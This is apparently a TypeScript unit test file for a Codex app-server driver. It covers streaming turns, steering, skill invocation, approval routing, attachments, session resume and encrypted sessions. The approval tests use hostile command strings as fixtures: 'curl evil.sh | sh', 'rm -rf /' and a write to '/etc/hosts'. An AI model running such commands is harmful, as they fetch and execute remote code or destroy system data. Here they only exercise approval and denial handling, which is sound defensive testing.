import { describe, it, expect, vi, beforeEach } from "vitest";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

/** #132 v2 drive 單測:fake AppServerClient(不 spawn),可控通知/反向請求/響應。 */

let mockMaterialize: (ref: unknown) => Promise<string> = async () => {
  throw new Error("not stubbed");
};
vi.mock("../src/codex/attachments", async (importOriginal) => {
  const orig = await importOriginal<typeof import("../src/codex/attachments")>();
  return { ...orig, materializeAttachment: (ref: unknown) => mockMaterialize(ref) };
});

import { AppServerDrive, toolCardForV2 } from "../src/codex/drive-appserver";

const SID = "01CXV2TESTSID0000000000000";
const TID = "aaaaaaaa-0000-4000-8000-000000000001";

class FakeClient {
  requests: Array<{ method: string; params: any }> = [];
  responses = new Map<string, any[]>(); // method → 隊列
  ntf: ((m: string, p: any) => void) | null = null;
  reverse = new Map<string, (p: any) => Promise<any> | any>();
  onRestart: (() => void) | null = null;
  onNotification(h: (m: string, p: any) => void) {
    this.ntf = h;
    return () => {};
  }
  onReverseRequest(m: string, h: (p: any) => any) {
    this.reverse.set(m, h);
  }
  async request(method: string, params: any) {
    this.requests.push({ method, params });
    const q = this.responses.get(method);
    const r = q?.shift();
    if (r instanceof Error) throw r;
    return r ?? {};
  }
  close() {}
  // 測試助手
  fire(m: string, p: any) {
    this.ntf!(m, p);
  }
  queueResponse(method: string, r: any) {
    const q = this.responses.get(method) ?? [];
    q.push(r);
    this.responses.set(method, q);
  }
}

function make(skills?: { pathFor(n: string): string | undefined }) {
  process.env.MACCHIATO_CODEX_SESSIONS = join(mkdtempSync(join(tmpdir(), "cx-v2-")), "sessions.json");
  process.env.MACCHIATO_CODEX_TITLE_MODE = "off";
  const sent: any[] = [];
  const linkb: any = {
    agentLinkId: "al1",
    isReady: true,
    handlers: [] as any[],
    onFrame(h: any) {
      this.handlers.push(h);
    },
    send(m: any) {
      sent.push(m);
    },
    async deliver(m: any) {
      for (const h of this.handlers) await h(m);
    },
  };
  const client = new FakeClient();
  client.queueResponse("thread/start", { thread: { id: TID } });
  const mirror: any = { driven: [] as string[], undriven: [] as string[], ff: [] as string[], setDriven(t: string) { this.driven.push(t); }, unsetDriven(t: string) { this.undriven.push(t); }, fastForward(t: string) { this.ff.push(t); }, tombstone() {} };
  const d = new AppServerDrive(client as any, linkb, mirror, undefined, undefined, skills);
  d.wire();
  return { d, client, linkb, sent, mirror };
}

const tui = (method: string, sessionId: string, params: any = {}) => ({
  t: "tui",
  sessionId,
  frame: { method, params: { session_id: sessionId, ...params } },
});
const events = (sent: any[]) => sent.filter((f) => f.frame?.params?.type).map((f) => f.frame.params);
const tick = () => new Promise((r) => setTimeout(r, 10));

beforeEach(() => {
  mockMaterialize = async () => {
    throw new Error("not stubbed");
  };
  delete process.env.MACCHIATO_CODEX_MODEL;
});

describe("#257 session.retitle", () => {
  it("從 rollout 首條 user 消息重算標題 → session.title(此前 codex 靜默 no-op)", async () => {
    const { mkdtempSync, writeFileSync, mkdirSync } = await import("node:fs");
    const { tmpdir } = await import("node:os");
    const { join } = await import("node:path");
    const root = mkdtempSync(join(tmpdir(), "cx-retitle-"));
    process.env.MACCHIATO_CODEX_SESSIONS_DIR = root; // sessionsRoot()
    const sdir = join(root, "2026", "07", "17");
    mkdirSync(sdir, { recursive: true });
    // rollout 文件名含 thread id(discoverRollouts 從檔名解析 UUID)
    const tid = "0199abcd-1111-2222-3333-444455556666";
    writeFileSync(
      join(sdir, `rollout-2026-07-17T00-00-00-${tid}.jsonl`),
      JSON.stringify({ type: "session_meta", payload: { cwd: "/w" } }) + "\n" +
        JSON.stringify({ type: "event_msg", payload: { type: "user_message", message: "幫我重構支付模塊的錯誤處理" } }) + "\n",
    );
    const { d, linkb, sent } = make();
    (d as any).map[SID] = tid; // 綁 sid → thread
    (d as any).byThread.set(tid, SID);
    await linkb.deliver(tui("session.retitle", SID, {}));
    await tick();
    const title = (sent.find((f: any) => f.frame?.params?.type === "session.title") as any)?.frame.params.payload.title;
    expect(title).toBe("幫我重構支付模塊的錯誤處理");
    delete process.env.MACCHIATO_CODEX_SESSIONS_DIR;
  });
});

describe("#258 未知通知告警", () => {
  it("已知線程收到未處理 method → unknownNotifications 計數(升版漂移可見)", async () => {
    const { d, client, linkb } = make();
    await linkb.deliver(tui("prompt.submit", SID, { text: "hi" }));
    client.fire("turn/started", { threadId: TID, turn: { id: "t1" } }); // 映射 TID→SID
    expect(d.counters.unknownNotifications).toBe(0);
    client.fire("thread/somethingNew/v3", { threadId: TID, foo: 1 }); // codex 假想升版新通知
    client.fire("thread/somethingNew/v3", { threadId: TID, foo: 2 }); // 同 method 去重不刷屏但計數累加
    expect(d.counters.unknownNotifications).toBe(2);
  });
});

describe("#132 v2 回合生命週期", () => {
  it("prompt → thread/start+turn/start;delta 流→message.delta;completed 不重發已流部分;usage 隨 complete", async () => {
    const { client, linkb, sent } = make();
    await linkb.deliver(tui("prompt.submit", SID, { text: "你好" }));
    expect(client.requests.map((r) => r.method)).toEqual(["thread/start", "turn/start"]);
    expect(client.requests[1]!.params.input).toEqual([{ type: "text", text: "你好" }]);
    client.fire("turn/started", { threadId: TID, turn: { id: "t1" } });
    client.fire("item/agentMessage/delta", { threadId: TID, itemId: "m1", delta: "早上" });
    client.fire("item/agentMessage/delta", { threadId: TID, itemId: "m1", delta: "好" });
    client.fire("item/completed", { threadId: TID, item: { type: "agentMessage", id: "m1", text: "早上好" } });
    client.fire("thread/tokenUsage/updated", { threadId: TID, tokenUsage: { last: { inputTokens: 10, outputTokens: 5 } } });
    client.fire("turn/completed", { threadId: TID, turn: { id: "t1", status: "completed" } });
    await tick();
    const evs = events(sent);
    expect(evs.map((e) => e.type)).toEqual(["message.start", "message.delta", "message.delta", "turn.usage", "message.complete"]);
    expect(evs.filter((e) => e.type === "message.delta").map((e) => e.payload.text)).toEqual(["早上", "好"]); // 定稿不補發
    const done = evs.at(-1)!;
    expect(done.payload.text).toBe("早上好");
    expect(done.payload.status).toBe("complete");
    expect(done.payload.usage.output_tokens).toBe(5);
  });

  it("多個 agentMessage item(commentary→final)→ 段落分隔;斷流時 completed 補尾", async () => {
    const { client, linkb, sent } = make();
    await linkb.deliver(tui("prompt.submit", SID, { text: "q" }));
    client.fire("turn/started", { threadId: TID, turn: { id: "t1" } });
    client.fire("item/agentMessage/delta", { threadId: TID, itemId: "m1", delta: "先跑一下" });
    client.fire("item/completed", { threadId: TID, item: { type: "agentMessage", id: "m1", text: "先跑一下測試" } }); // 斷流補「測試」
    client.fire("item/agentMessage/delta", { threadId: TID, itemId: "m2", delta: "完成" });
    client.fire("item/completed", { threadId: TID, item: { type: "agentMessage", id: "m2", text: "完成" } });
    client.fire("turn/completed", { threadId: TID, turn: { status: "completed" } });
    await tick();
    const done = events(sent).at(-1)!;
    expect(done.payload.text).toBe("先跑一下測試\n\n完成");
  });

  it("工具 item → tool.start/complete(camelCase 實料:command/aggregatedOutput/exitCode)", async () => {
    const { client, linkb, sent } = make();
    await linkb.deliver(tui("prompt.submit", SID, { text: "跑命令" }));
    client.fire("turn/started", { threadId: TID, turn: { id: "t1" } });
    client.fire("item/started", { threadId: TID, item: { type: "commandExecution", id: "e1", command: "ls", status: "inProgress" } });
    client.fire("item/completed", { threadId: TID, item: { type: "commandExecution", id: "e1", command: "ls", aggregatedOutput: "file1\n", exitCode: 1, status: "completed" } });
    client.fire("turn/completed", { threadId: TID, turn: { status: "completed" } });
    await tick();
    const tc = events(sent).find((e) => e.type === "tool.complete")!;
    expect(tc.payload.name).toBe("command");
    expect(tc.payload.args).toEqual({ command: "ls" });
    expect(tc.payload.result_text).toBe("file1\n");
    expect(tc.payload.error).toBe("exit 1");
  });

  it("turn/completed status=failed → message.complete error(+失敗行);interrupted → interrupted", async () => {
    const { client, linkb, sent } = make();
    await linkb.deliver(tui("prompt.submit", SID, { text: "q" }));
    client.fire("turn/started", { threadId: TID, turn: { id: "t1" } });
    client.fire("turn/completed", { threadId: TID, turn: { status: "failed", error: { message: "boom" } } });
    await tick();
    let evs = events(sent);
    expect(evs.find((e) => e.type === "review.summary")?.payload.summary).toContain("boom");
    expect(evs.at(-1)!.payload.status).toBe("error");
    // interrupted
    await linkb.deliver(tui("prompt.submit", SID, { text: "q2" }));
    client.fire("turn/started", { threadId: TID, turn: { id: "t2" } });
    await linkb.deliver(tui("session.interrupt", SID));
    expect(client.requests.at(-1)!.method).toBe("turn/interrupt");
    expect(client.requests.at(-1)!.params).toEqual({ threadId: TID, turnId: "t2" });
    client.fire("turn/completed", { threadId: TID, turn: { status: "interrupted" } });
    await tick();
    evs = events(sent);
    expect(evs.at(-1)!.payload.status).toBe("interrupted");
  });

  it("#310 auth 類失敗(401/token expired)→ 可行動文案(codex login)+ authFailed;成功回合恢復", async () => {
    const { d, client, linkb, sent } = make();
    await linkb.deliver(tui("prompt.submit", SID, { text: "q" }));
    client.fire("turn/started", { threadId: TID, turn: { id: "t1" } });
    client.fire("turn/completed", { threadId: TID, turn: { status: "failed", error: { message: "401 Unauthorized: token has expired" } } });
    await tick();
    const line = events(sent).find((e) => e.type === "review.summary");
    expect(line?.payload.summary).toContain("codex login"); // 可行動,非裸錯誤串
    expect(d.authFailed).toBe(true); // health 據此上報 authOk=false
    // 成功回合 → 恢復
    await linkb.deliver(tui("prompt.submit", SID, { text: "q2" }));
    client.fire("turn/started", { threadId: TID, turn: { id: "t2" } });
    client.fire("item/completed", { threadId: TID, item: { type: "agentMessage", id: "m1", text: "ok" } });
    client.fire("turn/completed", { threadId: TID, turn: { status: "completed" } });
    await tick();
    expect(d.authFailed).toBe(false);
    // 非 auth 失敗(boom)不誤標
    await linkb.deliver(tui("prompt.submit", SID, { text: "q3" }));
    client.fire("turn/started", { threadId: TID, turn: { id: "t3" } });
    client.fire("turn/completed", { threadId: TID, turn: { status: "failed", error: { message: "boom" } } });
    await tick();
    expect(d.authFailed).toBe(false);
  });
});

describe("#132 v2 steer", () => {
  it("回合進行中的 prompt → turn/steer(expectedTurnId);steer 失敗 → 回退新回合", async () => {
    const { client, linkb } = make();
    await linkb.deliver(tui("prompt.submit", SID, { text: "第一條" }));
    client.fire("turn/started", { threadId: TID, turn: { id: "t1" } });
    await linkb.deliver(tui("prompt.submit", SID, { text: "改一下方向" }));
    const steer = client.requests.find((r) => r.method === "turn/steer")!;
    expect(steer.params).toMatchObject({ threadId: TID, expectedTurnId: "t1", input: [{ type: "text", text: "改一下方向" }] });
    expect(client.requests.filter((r) => r.method === "turn/start")).toHaveLength(1); // 未起新回合
    // steer 失敗(回合剛結束競態)→ 回退 turn/start
    client.fire("turn/completed", { threadId: TID, turn: { status: "completed" } });
    await tick();
    client.queueResponse("turn/steer", new Error("expectedTurnId mismatch"));
    await linkb.deliver(tui("prompt.submit", SID, { text: "又一條" }));
    expect(client.requests.filter((r) => r.method === "turn/start")).toHaveLength(2);
  });
});

describe("#317 command.invoke → SkillUserInput", () => {
  // 注:別用 /home/... 假路徑——sync-public 敏感串掃描含 /home/[a-z]+/(私有路徑防洩),公開樹會中止。
  const SKILL_PATH = "/data/codex-home/skills/.system/imagegen/SKILL.md";
  const idx = { pathFor: (n: string) => (n === "imagegen" ? SKILL_PATH : undefined) };
  it("索引命中:turn/start input = skill 項 + args text 項", async () => {
    const { client, linkb } = make(idx);
    await linkb.deliver(tui("command.invoke", SID, { command: "/imagegen", args: "畫個 logo" }));
    await tick();
    const ts = client.requests.find((r) => r.method === "turn/start")!;
    expect(ts.params.input).toEqual([
      { type: "skill", name: "imagegen", path: SKILL_PATH },
      { type: "text", text: "畫個 logo" },
    ]);
  });
  it("無 args:只有 skill 項;索引未命中 → 回退 $name 文本(消息不丟)", async () => {
    const { client, linkb } = make(idx);
    await linkb.deliver(tui("command.invoke", SID, { command: "imagegen" }));
    await tick();
    expect(client.requests.find((r) => r.method === "turn/start")!.params.input).toEqual([
      { type: "skill", name: "imagegen", path: SKILL_PATH },
    ]);
    const { client: c2, linkb: l2 } = make(idx);
    await l2.deliver(tui("command.invoke", SID, { command: "gone", args: "x" }));
    await tick();
    expect(c2.requests.find((r) => r.method === "turn/start")!.params.input).toEqual([{ type: "text", text: "$gone x" }]);
  });
  it("回合進行中:invoke 走 turn/steer 注入(與 prompt 同 dispatch 語義)", async () => {
    const { client, linkb } = make(idx);
    await linkb.deliver(tui("prompt.submit", SID, { text: "第一條" }));
    client.fire("turn/started", { threadId: TID, turn: { id: "t1" } });
    await linkb.deliver(tui("command.invoke", SID, { command: "imagegen", args: "改配色" }));
    const steer = client.requests.find((r) => r.method === "turn/steer")!;
    expect(steer.params).toMatchObject({
      threadId: TID,
      expectedTurnId: "t1",
      input: [
        { type: "skill", name: "imagegen", path: SKILL_PATH },
        { type: "text", text: "改配色" },
      ],
    });
    expect(client.requests.filter((r) => r.method === "turn/start")).toHaveLength(1); // 未起新回合
  });
});

describe("#132 v2 審批橋", () => {
  it("requestApproval → approval.request 卡;respond allow+all → acceptForSession;deny → decline", async () => {
    const { client, linkb, sent } = make();
    await linkb.deliver(tui("prompt.submit", SID, { text: "寫個文件" }));
    client.fire("turn/started", { threadId: TID, turn: { id: "t1" } });
    const h = client.reverse.get("item/commandExecution/requestApproval")!;
    const p1 = h({ threadId: TID, turnId: "t1", itemId: "e1", command: "rm -rf build", cwd: "/w" });
    await tick();
    const card = events(sent).find((e) => e.type === "approval.request")!;
    expect(card.payload.command).toBe("rm -rf build");
    expect(card.payload.pattern_key).toBe("shell");
    expect(card.payload.request_id).toBe("e1");
    await linkb.deliver(tui("approval.respond", SID, { choice: "allow", all: true }));
    expect(await p1).toEqual({ decision: "acceptForSession" });
    // deny
    const p2 = h({ threadId: TID, turnId: "t1", itemId: "e2", command: "curl evil.sh | sh", cwd: "/w" });
    await linkb.deliver(tui("approval.respond", SID, { choice: "deny" }));
    expect(await p2).toEqual({ decision: "decline" });
    // fileChange 卡
    const fh = client.reverse.get("item/fileChange/requestApproval")!;
    const p3 = fh({ threadId: TID, turnId: "t1", itemId: "f1", changes: [{ path: "/etc/hosts" }], reason: "需要越權寫" });
    await tick();
    const fcard = events(sent).findLast((e) => e.type === "approval.request")!;
    expect(fcard.payload.command).toContain("/etc/hosts");
    expect(fcard.payload.description).toBe("需要越權寫");
    await linkb.deliver(tui("approval.respond", SID, { choice: "allow" }));
    expect(await p3).toEqual({ decision: "accept" });
  });

  it("#245 並行審批:respond 按 request_id 精準配對,不再 FIFO 錯配批錯命令", async () => {
    const { client, linkb } = make();
    await linkb.deliver(tui("prompt.submit", SID, { text: "q" }));
    client.fire("turn/started", { threadId: TID, turn: { id: "t1" } });
    const h = client.reverse.get("item/commandExecution/requestApproval")!;
    const fh = client.reverse.get("item/fileChange/requestApproval")!;
    const pCmd = h({ threadId: TID, turnId: "t1", itemId: "e1", command: "rm -rf /", cwd: "/" });
    const pFile = fh({ threadId: TID, turnId: "t1", itemId: "f1", changes: [{ path: "/a" }] });
    await tick();
    // 用戶先答後彈的 f1(允許)再答 e1(拒絕)——舊 FIFO 把「允許」錯配給隊首的 rm -rf
    await linkb.deliver(tui("approval.respond", SID, { choice: "allow", request_id: "f1" }));
    await linkb.deliver(tui("approval.respond", SID, { choice: "deny", request_id: "e1" }));
    expect(await pFile).toEqual({ decision: "accept" });
    expect(await pCmd).toEqual({ decision: "decline" });
  });

  it("#245 interrupt 掛起:turnId 未到位時點停止不再被吞,到位即補發", async () => {
    const { client, linkb } = make();
    await linkb.deliver(tui("prompt.submit", SID, { text: "q" }));
    // turn/start 已返回(fixture 不帶 turn.id)、turn/started 未到 → turnId 空窗口
    await linkb.deliver(tui("session.interrupt", SID));
    expect(client.requests.filter((r) => r.method === "turn/interrupt")).toHaveLength(0); // 掛起
    client.fire("turn/started", { threadId: TID, turn: { id: "t9" } });
    await tick();
    const ti = client.requests.filter((r) => r.method === "turn/interrupt");
    expect(ti).toHaveLength(1); // 補發而非吞掉
    expect(ti[0]!.params).toEqual({ threadId: TID, turnId: "t9" });
  });

  it("回合結束仍懸空的審批 → decline 收尾(反向請求不永久掛)", async () => {
    const { client, linkb } = make();
    await linkb.deliver(tui("prompt.submit", SID, { text: "q" }));
    client.fire("turn/started", { threadId: TID, turn: { id: "t1" } });
    const h = client.reverse.get("item/commandExecution/requestApproval")!;
    const p = h({ threadId: TID, turnId: "t1", itemId: "e1", command: "x", cwd: "/" });
    client.fire("turn/completed", { threadId: TID, turn: { status: "interrupted" } });
    await tick();
    expect(await p).toEqual({ decision: "decline" });
  });
});

describe("#132 v2 附件/resume/重啟", () => {
  it("image 附件 → localImage UserInput(原生視覺);文件照舊路徑注入", async () => {
    mockMaterialize = async (ref: any) => `/tmp/att/${ref.name}`;
    const { client, linkb } = make();
    await linkb.deliver(
      tui("prompt.submit", SID, {
        text: "看圖",
        attachments: [
          { id: "a1", kind: "image", name: "shot.png", mime: "image/png", url: "https://x/a1" },
          { id: "a2", kind: "document", name: "doc.pdf", mime: "application/pdf", url: "https://x/a2" },
        ],
      }),
    );
    await tick(); // materialize ×2 的 await 拍;wire 是 fire-and-forget
    const input = client.requests.find((r) => r.method === "turn/start")!.params.input;
    expect(input.find((i: any) => i.type === "localImage")).toEqual({ type: "localImage", path: "/tmp/att/shot.png" });
    expect(input.find((i: any) => i.type === "text").text).toContain("/tmp/att/doc.pdf"); // 路徑注入
  });

  it("既有映射(UUID sid)→ thread/resume 一次;同進程第二回合不再 resume", async () => {
    const { client, linkb } = make();
    client.queueResponse("thread/resume", { thread: { id: TID } });
    await linkb.deliver(tui("prompt.submit", TID, { text: "續聊" }));
    expect(client.requests.map((r) => r.method)).toEqual(["thread/resume", "turn/start"]);
    client.fire("turn/started", { threadId: TID, turn: { id: "t1" } });
    client.fire("turn/completed", { threadId: TID, turn: { status: "completed" } });
    await tick();
    await linkb.deliver(tui("prompt.submit", TID, { text: "再來" }));
    expect(client.requests.map((r) => r.method)).toEqual(["thread/resume", "turn/start", "turn/start"]);
  });

  it("app-server 重啟 → 活躍回合定稿 interrupted+提示重發;loadedThreads 清空 → 下回合重新 resume", async () => {
    const { client, linkb, sent } = make();
    await linkb.deliver(tui("prompt.submit", SID, { text: "q" }));
    client.fire("turn/started", { threadId: TID, turn: { id: "t1" } });
    client.fire("item/agentMessage/delta", { threadId: TID, itemId: "m1", delta: "寫到一半" });
    client.onRestart!();
    await tick();
    const evs = events(sent);
    expect(evs.at(-2)!.type).toBe("message.complete");
    expect(evs.at(-2)!.payload.status).toBe("interrupted");
    expect(evs.at(-1)!.payload.summary).toContain("重發");
    // 下一回合:thread 已有映射但進程新生 → thread/resume
    client.queueResponse("thread/resume", { thread: { id: TID } });
    await linkb.deliver(tui("prompt.submit", SID, { text: "重發" }));
    expect(client.requests.filter((r) => r.method === "thread/resume")).toHaveLength(1);
  });

  it("E2E 回合:user+reply 加密成 mirror_append,不走明文 tui", async () => {
    const { client, sent } = make();
    const e2e: any = { isE2E: () => true, decryptText: (_s: string, t: string) => t, encryptContent: (_s: string, o: any) => "enc:" + JSON.stringify(o) };
    const d2sent: any[] = [];
    const lb: any = { agentLinkId: "al", isReady: true, handlers: [], onFrame(h: any) { this.handlers.push(h); }, send: (m: any) => d2sent.push(m), async deliver(m: any) { for (const h of this.handlers) await h(m); } };
    const c2 = new FakeClient();
    c2.queueResponse("thread/start", { thread: { id: TID } });
    process.env.MACCHIATO_CODEX_SESSIONS = join(mkdtempSync(join(tmpdir(), "cx-v2e-")), "s.json");
    const d = new AppServerDrive(c2 as any, lb, undefined, e2e);
    d.wire();
    await lb.deliver(tui("prompt.submit", SID, { text: "秘密" }));
    c2.fire("turn/started", { threadId: TID, turn: { id: "t1" } });
    c2.fire("item/agentMessage/delta", { threadId: TID, itemId: "m1", delta: "答案" });
    c2.fire("item/completed", { threadId: TID, item: { type: "agentMessage", id: "m1", text: "答案" } });
    c2.fire("turn/completed", { threadId: TID, turn: { status: "completed" } });
    await tick();
    expect(d2sent.filter((f) => f.t === "tui" && JSON.stringify(f).includes("答案"))).toHaveLength(0);
    const mf = d2sent.find((f) => f.t === "mirror_append");
    expect(mf.sessions[0].e2e).toBe(true);
    expect(mf.sessions[0].messages.map((m: any) => m.role)).toEqual(["user", "agent"]);
    void sent;
    void client;
  });

  it("#240 E2E 審批卡:命令加密進 enc,明文只留占位 + 類別", async () => {
    const store: string[] = [];
    const e2e: any = { isE2E: () => true, decryptText: (_s: string, t: string) => t, encryptContent: (_s: string, o: any) => { store.push(JSON.stringify(o)); return `enc#${store.length - 1}`; } };
    const d2sent: any[] = [];
    const lb: any = { agentLinkId: "al", isReady: true, handlers: [], onFrame(h: any) { this.handlers.push(h); }, send: (m: any) => d2sent.push(m), async deliver(m: any) { for (const h of this.handlers) await h(m); } };
    const c2 = new FakeClient();
    c2.queueResponse("thread/start", { thread: { id: TID } });
    process.env.MACCHIATO_CODEX_SESSIONS = join(mkdtempSync(join(tmpdir(), "cx-v2ea-")), "s.json");
    const d = new AppServerDrive(c2 as any, lb, undefined, e2e);
    d.wire();
    await lb.deliver(tui("prompt.submit", SID, { text: "秘密" }));
    await tick(); // 等 thread/start 解析 → byThread 有 TID(否則反向請求找不到 sid)
    c2.fire("turn/started", { threadId: TID, turn: { id: "t1" } });
    const h = c2.reverse.get("item/commandExecution/requestApproval")!;
    const p = h({ threadId: TID, turnId: "t1", itemId: "e1", command: "rm -rf /secret", cwd: "/w" });
    await tick();
    const card = (d2sent.find((f) => f.t === "tui" && f.frame?.params?.type === "approval.request") as any).frame.params.payload;
    expect(card.command).toBe("🔒 加密審批請求");
    expect(card.pattern_key).toBe("shell");
    expect(card.request_id).toBe("e1");
    expect(typeof card.enc).toBe("string");
    expect(JSON.stringify(card).includes("rm -rf")).toBe(false); // 命令全文不在明文
    expect(store.some((s) => s.includes("rm -rf /secret"))).toBe(true);
    // choice 回程照舊
    await lb.deliver(tui("approval.respond", SID, { choice: "allow", request_id: "e1" }));
    expect(await p).toEqual({ decision: "accept" });
  });
});

describe("#132 toolCardForV2", () => {
  it("fileChange/mcpToolCall/webSearch/未知類型", () => {
    expect(toolCardForV2({ type: "fileChange", changes: [{ path: "a.ts" }], status: "completed" }).args).toEqual({ changes: [{ path: "a.ts" }] });
    const mcp = toolCardForV2({ type: "mcpToolCall", server: "gh", tool: "search", arguments: { q: "x" }, status: "completed" });
    expect(mcp.name).toBe("mcp:gh.search");
    expect(toolCardForV2({ type: "webSearch", query: "天氣" }).args).toEqual({ query: "天氣" });
    const unk = toolCardForV2({ type: "future", id: "x", detail: "y".repeat(600) });
    expect(unk.name).toBe("future");
    expect(String(unk.args.detail)).toHaveLength(501);
  });
});

describe("#224 codex 改名雙向", () => {
  it("session.rename → thread/name/set(回寫);thread/name/updated → session.title(餵標題)", async () => {
    const { d, client, linkb, sent } = make();
    // 先起一個回合建立 thread 映射(byThread);清掉首回合的佔位標題,只看改名相關事件
    await linkb.deliver(tui("prompt.submit", SID, { text: "hi" }));
    client.fire("turn/started", { threadId: TID, turn: { id: "t1" } });
    await tick();
    sent.length = 0;
    // 方向1:app 改名 → thread/name/set
    await linkb.deliver(tui("session.rename", SID, { title: "支付重構" }));
    const setCall = client.requests.find((r) => r.method === "thread/name/set");
    expect(setCall?.params).toEqual({ threadId: TID, name: "支付重構" });
    // 自寫回聲:同名的 thread/name/updated 不回投 session.title
    client.fire("thread/name/updated", { threadId: TID, threadName: "支付重構" });
    await tick();
    expect(events(sent).filter((e) => e.type === "session.title")).toHaveLength(0);
    // 方向2:codex 自己起的新名 → session.title
    client.fire("thread/name/updated", { threadId: TID, threadName: "Codex 自己的標題" });
    await tick();
    const titles = events(sent).filter((e) => e.type === "session.title");
    expect(titles).toHaveLength(1);
    expect(titles[0].payload.title).toBe("Codex 自己的標題");
  });

  it("E2E 會話:thread/name/updated 不投 session.title(標題明文,#113 紀律)", async () => {
    const sent: any[] = [];
    const lb: any = { agentLinkId: "al", isReady: true, handlers: [], onFrame(h: any) { this.handlers.push(h); }, send: (m: any) => sent.push(m), async deliver(m: any) { for (const h of this.handlers) await h(m); } };
    const c2 = new FakeClient();
    c2.queueResponse("thread/start", { thread: { id: TID } });
    process.env.MACCHIATO_CODEX_SESSIONS = join(mkdtempSync(join(tmpdir(), "cx-224e-")), "s.json");
    const e2e: any = { isE2E: () => true, decryptText: (_s: string, t: string) => t, encryptContent: () => "enc" };
    const d = new AppServerDrive(c2 as any, lb, undefined, e2e);
    d.wire();
    await lb.deliver(tui("prompt.submit", SID, { text: "秘密" }));
    c2.fire("turn/started", { threadId: TID, turn: { id: "t1" } });
    c2.fire("thread/name/updated", { threadId: TID, threadName: "不該外洩的標題" });
    await tick();
    expect(sent.filter((f) => f.frame?.params?.type === "session.title")).toHaveLength(0);
    void d;
  });
});
